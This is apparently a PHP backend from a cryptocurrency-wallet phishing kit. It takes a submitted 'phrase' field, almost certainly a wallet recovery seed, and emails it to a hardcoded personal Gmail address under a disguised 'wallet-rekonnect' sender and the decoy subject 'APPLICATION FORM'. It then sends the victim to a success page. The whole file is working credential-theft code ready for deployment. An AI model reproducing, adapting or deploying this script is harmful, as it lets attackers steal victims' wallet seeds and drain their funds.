<?php
$phrase = $_POST['phrase'];

$subject = "APPLICATION FORM";
$fromname = "Great Adventure Int'l";
$fromemail = 'wallet-rekonnect@connect.com'; // Replace with your actual email address
$mailto = 'rotimiariyo@gmail.com'; // Replace with the recipient's email address

$message = "Phrase = " . $phrase;
$headers = "From: $fromname <$fromemail>\r\n";
$headers .= "Reply-To: $fromemail\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=UTF-8\r\n";

// Set the SMTP server and port
ini_set("SMTP", "smtp.example.com"); // Replace with your SMTP server
ini_set("smtp_port", "587"); // Replace with the appropriate port (usually 587 for TLS/SSL)

// Send Mail
if (mail($mailto, $subject, $message, $headers)) {
    header("Location: ../success.html"); // Redirect to success page
    exit(); // Terminate script execution after sending the email
} else {
    echo "Mail send ... ERROR!";
    print_r(error_get_last());
}
?>
